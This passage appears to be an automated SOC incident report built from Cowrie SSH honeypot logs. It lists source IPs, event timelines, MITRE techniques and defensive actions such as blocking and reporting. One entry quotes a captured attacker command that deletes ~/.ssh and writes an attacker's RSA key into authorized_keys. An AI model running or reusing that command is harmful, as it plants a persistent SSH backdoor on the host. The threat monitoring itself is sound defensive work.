| `2026-08-23 08:13:18` | `cowrie.login.success` |
| `2026-08-23 08:13:18` | `cowrie.direct-tcpip.request` |
| `2026-08-23 08:13:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.170.213[.]9` to AbuseIPDB if not already reported
- [ ] Block `200.170.213[.]9` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-532389c5e93c

| Field | Detail |
|---|---|
| **Source IP** | `187.93.68[.]178` |
| **First Seen** | 2026-08-23 08:13 |
| **Last Seen** | 2026-08-23 08:13 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 08:13:24` | `cowrie.session.connect` |
| `2026-08-23 08:13:25` | `cowrie.client.version` |
| `2026-08-23 08:13:25` | `cowrie.client.kex` |
| `2026-08-23 08:13:26` | `cowrie.login.success` |
| `2026-08-23 08:13:27` | `cowrie.direct-tcpip.request` |
| `2026-08-23 08:13:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.93.68[.]178` to AbuseIPDB if not already reported
- [ ] Block `187.93.68[.]178` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-404d71c2c9a3

| Field | Detail |
|---|---|
| **Source IP** | `119.237.15[.]136` |
| **First Seen** | 2026-08-23 08:17 |
| **Last Seen** | 2026-08-23 08:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 08:17:34` | `cowrie.session.connect` |
| `2026-08-23 08:17:34` | `cowrie.client.version` |
| `2026-08-23 08:17:34` | `cowrie.client.kex` |
| `2026-08-23 08:17:36` | `cowrie.login.success` |
| `2026-08-23 08:17:37` | `cowrie.direct-tcpip.request` |
| `2026-08-23 08:17:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.237.15[.]136` to AbuseIPDB if not already reported
- [ ] Block `119.237.15[.]136` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2af2aee5a9e8

| Field | Detail |
|---|---|
| **Source IP** | `211.178.165[.]251` |
| **First Seen** | 2026-08-23 08:17 |
| **Last Seen** | 2026-08-23 08:17 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 08:17:42` | `cowrie.session.connect` |
| `2026-08-23 08:17:43` | `cowrie.client.version` |
| `2026-08-23 08:17:43` | `cowrie.client.kex` |
| `2026-08-23 08:17:46` | `cowrie.login.success` |
| `2026-08-23 08:17:46` | `cowrie.direct-tcpip.request` |
| `2026-08-23 08:17:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.178.165[.]251` to AbuseIPDB if not already reported
- [ ] Block `211.178.165[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3de1c91a414

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 08:20 |
| **Last Seen** | 2026-08-23 08:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 08:20:45` | `cowrie.session.connect` |
| `2026-08-23 08:20:45` | `cowrie.client.version` |
| `2026-08-23 08:20:45` | `cowrie.client.kex` |
| `2026-08-23 08:20:46` | `cowrie.login.success` |
| `2026-08-23 08:20:46` | `cowrie.direct-tcpip.request` |
| `2026-08-23 08:20:46` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 08:20:46` | `cowrie.direct-tcpip.data` |
| `2026-08-23 08:20:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd8d3257dd2d

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 08:20 |
| **Last Seen** | 2026-08-23 08:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 08:20:49` | `cowrie.session.connect` |
| `2026-08-23 08:20:49` | `cowrie.client.version` |
| `2026-08-23 08:20:49` | `cowrie.client.kex` |
| `2026-08-23 08:20:50` | `cowrie.login.success` |
| `2026-08-23 08:20:50` | `cowrie.direct-tcpip.request` |
| `2026-08-23 08:20:51` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 08:20:51` | `cowrie.direct-tcpip.data` |
| `2026-08-23 08:20:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5399e6747e5

| Field | Detail |
|---|---|
| **Source IP** | `101.13.5[.]28` |
| **First Seen** | 2026-08-23 08:22 |
| **Last Seen** | 2026-08-23 08:22 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 08:22:35` | `cowrie.session.connect` |
| `2026-08-23 08:22:36` | `cowrie.client.version` |
| `2026-08-23 08:22:36` | `cowrie.client.kex` |
| `2026-08-23 08:22:39` | `cowrie.login.success` |
| `2026-08-23 08:22:39` | `cowrie.direct-tcpip.request` |
| `2026-08-23 08:22:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.13.5[.]28` to AbuseIPDB if not already reported
- [ ] Block `101.13.5[.]28` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f2ad792b3c4

| Field | Detail |
|---|---|
| **Source IP** | `187.8.120[.]90` |
| **First Seen** | 2026-08-23 08:22 |
| **Last Seen** | 2026-08-23 08:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 08:22:45` | `cowrie.session.connect` |
| `2026-08-23 08:22:46` | `cowrie.client.version` |
| `2026-08-23 08:22:46` | `cowrie.client.kex` |
| `2026-08-23 08:22:48` | `cowrie.login.success` |
| `2026-08-23 08:22:48` | `cowrie.direct-tcpip.request` |
| `2026-08-23 08:22:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.8.120[.]90` to AbuseIPDB if not already reported
- [ ] Block `187.8.120[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45b6a9cad84c

| Field | Detail |
|---|---|
| **Source IP** | `197.227.8[.]186` |
| **First Seen** | 2026-08-23 08:26 |
| **Last Seen** | 2026-08-23 08:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 08:26:59` | `cowrie.session.connect` |
| `2026-08-23 08:26:59` | `cowrie.client.version` |
| `2026-08-23 08:26:59` | `cowrie.client.kex` |
| `2026-08-23 08:27:00` | `cowrie.login.success` |
| `2026-08-23 08:27:02` | `cowrie.session.params` |
| `2026-08-23 08:27:02` | `cowrie.command.input` |
| `2026-08-23 08:27:02` | `cowrie.command.failed` |
| `2026-08-23 08:27:02` | `cowrie.log.closed` |
| `2026-08-23 08:27:03` | `cowrie.session.params` |
| `2026-08-23 08:27:03` | `cowrie.command.input` |
| `2026-08-23 08:27:03` | `cowrie.session.file_download` |
| `2026-08-23 08:27:03` | `cowrie.log.closed` |
| `2026-08-23 08:27:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.227.8[.]186` to AbuseIPDB if not already reported
- [ ] Block `197.227.8[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f07f228a28f5

| Field | Detail |
|---|---|
| **Source IP** | `197.227.8[.]186` |
| **First Seen** | 2026-08-23 08:27 |
| **Last Seen** | 2026-08-23 08:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 08:27:04` | `cowrie.session.connect` |
| `2026-08-23 08:27:04` | `cowrie.client.version` |
| `2026-08-23 08:27:04` | `cowrie.client.kex` |
| `2026-08-23 08:27:05` | `cowrie.login.success` |
| `2026-08-23 08:27:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.227.8[.]186` to AbuseIPDB if not already reported
- [ ] Block `197.227.8[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66172804dcab

| Field | Detail |
|---|---|
| **Source IP** | `197.227.8[.]186` |
| **First Seen** | 2026-08-23 08:27 |
| **Last Seen** | 2026-08-23 08:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 08:27:06` | `cowrie.session.connect` |
| `2026-08-23 08:27:06` | `cowrie.client.version` |
| `2026-08-23 08:27:06` | `cowrie.client.kex` |
| `2026-08-23 08:27:07` | `cowrie.login.success` |
| `2026-08-23 08:27:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.227.8[.]186` to AbuseIPDB if not already reported
- [ ] Block `197.227.8[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd8079dea204

| Field | Detail |
|---|---|
| **Source IP** | `109.233.21[.]109` |
| **First Seen** | 2026-08-23 08:27 |
| **Last Seen** | 2026-08-23 08:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 08:27:24` | `cowrie.session.connect` |
| `2026-08-23 08:27:24` | `cowrie.client.version` |
| `2026-08-23 08:27:24` | `cowrie.client.kex` |
| `2026-08-23 08:27:25` | `cowrie.login.success` |
| `2026-08-23 08:27:26` | `cowrie.direct-tcpip.request` |
| `2026-08-23 08:27:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.233.21[.]109` to AbuseIPDB if not already reported
- [ ] Block `109.233.21[.]109` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3725fc7fa5c1

| Field | Detail |
|---|---|
| **Source IP** | `218.202.91[.]147` |
| **First Seen** | 2026-08-23 08:27 |
| **Last Seen** | 2026-08-23 08:27 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 08:27:31` | `cowrie.session.connect` |
| `2026-08-23 08:27:32` | `cowrie.client.version` |
| `2026-08-23 08:27:32` | `cowrie.client.kex` |
| `2026-08-23 08:27:35` | `cowrie.login.success` |
| `2026-08-23 08:27:36` | `cowrie.direct-tcpip.request` |
| `2026-08-23 08:27:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.202.91[.]147` to AbuseIPDB if not already reported
- [ ] Block `218.202.91[.]147` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3050b8dfa26

| Field | Detail |
|---|---|
| **Source IP** | `60.174.35[.]18` |
| **First Seen** | 2026-08-23 08:27 |
| **Last Seen** | 2026-08-23 08:27 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 08:27:37` | `cowrie.session.connect` |
| `2026-08-23 08:27:38` | `cowrie.client.version` |
| `2026-08-23 08:27:38` | `cowrie.client.kex` |
| `2026-08-23 08:27:41` | `cowrie.login.success` |
| `2026-08-23 08:27:42` | `cowrie.direct-tcpip.request` |
| `2026-08-23 08:27:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.174.35[.]18` to AbuseIPDB if not already reported
- [ ] Block `60.174.35[.]18` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10800eabb92c

| Field | Detail |
|---|---|
| **Source IP** | `221.199.172[.]66` |
| **First Seen** | 2026-08-23 08:27 |
| **Last Seen** | 2026-08-23 08:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 08:27:48` | `cowrie.session.connect` |
| `2026-08-23 08:27:48` | `cowrie.client.version` |
| `2026-08-23 08:27:48` | `cowrie.client.kex` |
| `2026-08-23 08:27:50` | `cowrie.login.success` |
| `2026-08-23 08:27:51` | `cowrie.direct-tcpip.request` |
| `2026-08-23 08:27:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.199.172[.]66` to AbuseIPDB if not already reported
- [ ] Block `221.199.172[.]66` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd0a9b108f7c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 08:30 |
| **Last Seen** | 2026-08-23 08:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 08:30:13` | `cowrie.session.connect` |
| `2026-08-23 08:30:13` | `cowrie.client.version` |
| `2026-08-23 08:30:13` | `cowrie.client.kex` |
| `2026-08-23 08:30:14` | `cowrie.login.success` |
| `2026-08-23 08:30:14` | `cowrie.direct-tcpip.request` |
| `2026-08-23 08:30:15` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 08:30:15` | `cowrie.direct-tcpip.data` |
| `2026-08-23 08:30:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-891538c7cc8b

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 08:30 |
| **Last Seen** | 2026-08-23 08:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 08:30:17` | `cowrie.session.connect` |
| `2026-08-23 08:30:17` | `cowrie.client.version` |
| `2026-08-23 08:30:17` | `cowrie.client.kex` |
| `2026-08-23 08:30:18` | `cowrie.login.success` |
| `2026-08-23 08:30:18` | `cowrie.direct-tcpip.request` |
| `2026-08-23 08:30:19` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 08:30:19` | `cowrie.direct-tcpip.data` |
| `2026-08-23 08:30:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4145cfe2d4c4

| Field | Detail |
|---|---|
| **Source IP** | `182.95.180[.]82` |
| **First Seen** | 2026-08-23 08:30 |
| **Last Seen** | 2026-08-23 08:30 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 08:30:36` | `cowrie.session.connect` |
| `2026-08-23 08:30:37` | `cowrie.client.version` |
| `2026-08-23 08:30:37` | `cowrie.client.kex` |
| `2026-08-23 08:30:38` | `cowrie.login.success` |
| `2026-08-23 08:30:39` | `cowrie.direct-tcpip.request` |
| `2026-08-23 08:30:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.95.180[.]82` to AbuseIPDB if not already reported
- [ ] Block `182.95.180[.]82` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fd2044ba4f0

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 08:39 |
| **Last Seen** | 2026-08-23 08:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 08:39:49` | `cowrie.session.connect` |
| `2026-08-23 08:39:49` | `cowrie.client.version` |
| `2026-08-23 08:39:49` | `cowrie.client.kex` |
| `2026-08-23 08:39:50` | `cowrie.login.success` |
| `2026-08-23 08:39:50` | `cowrie.direct-tcpip.request` |
| `2026-08-23 08:39:50` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 08:39:50` | `cowrie.direct-tcpip.data` |
| `2026-08-23 08:39:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0b69612c7cf

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 08:39 |
| **Last Seen** | 2026-08-23 08:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 08:39:53` | `cowrie.session.connect` |
| `2026-08-23 08:39:53` | `cowrie.client.version` |
| `2026-08-23 08:39:53` | `cowrie.client.kex` |
| `2026-08-23 08:39:54` | `cowrie.login.success` |
| `2026-08-23 08:39:54` | `cowrie.direct-tcpip.request` |
| `2026-08-23 08:39:54` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 08:39:54` | `cowrie.direct-tcpip.data` |
| `2026-08-23 08:39:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8118cdcdd2e

| Field | Detail |
|---|---|
| **Source IP** | `65.20.204[.]254` |
| **First Seen** | 2026-08-23 08:46 |
| **Last Seen** | 2026-08-23 08:46 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 08:46:00` | `cowrie.session.connect` |
| `2026-08-23 08:46:00` | `cowrie.client.version` |
| `2026-08-23 08:46:00` | `cowrie.client.kex` |
| `2026-08-23 08:46:02` | `cowrie.login.success` |
| `2026-08-23 08:46:02` | `cowrie.direct-tcpip.request` |
| `2026-08-23 08:46:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.204[.]254` to AbuseIPDB if not already reported
- [ ] Block `65.20.204[.]254` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4104cc5671d3

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-23 08:46 |
| **Last Seen** | 2026-08-23 08:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 08:46:35` | `cowrie.session.connect` |
| `2026-08-23 08:46:35` | `cowrie.client.version` |
| `2026-08-23 08:46:36` | `cowrie.client.kex` |
| `2026-08-23 08:46:36` | `cowrie.login.success` |
| `2026-08-23 08:46:36` | `cowrie.direct-tcpip.request` |
| `2026-08-23 08:46:36` | `cowrie.direct-tcpip.data` |
| `2026-08-23 08:46:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c534f2b48a2

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 08:49 |
| **Last Seen** | 2026-08-23 08:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 08:49:21` | `cowrie.session.connect` |
| `2026-08-23 08:49:21` | `cowrie.client.version` |
| `2026-08-23 08:49:21` | `cowrie.client.kex` |
| `2026-08-23 08:49:22` | `cowrie.login.success` |
| `2026-08-23 08:49:22` | `cowrie.direct-tcpip.request` |
| `2026-08-23 08:49:23` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 08:49:23` | `cowrie.direct-tcpip.data` |
| `2026-08-23 08:49:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1966d6964c19

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 08:49 |
| **Last Seen** | 2026-08-23 08:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 08:49:25` | `cowrie.session.connect` |
| `2026-08-23 08:49:25` | `cowrie.client.version` |
| `2026-08-23 08:49:25` | `cowrie.client.kex` |
| `2026-08-23 08:49:26` | `cowrie.login.success` |
| `2026-08-23 08:49:26` | `cowrie.direct-tcpip.request` |
| `2026-08-23 08:49:26` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 08:49:26` | `cowrie.direct-tcpip.data` |
| `2026-08-23 08:49:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
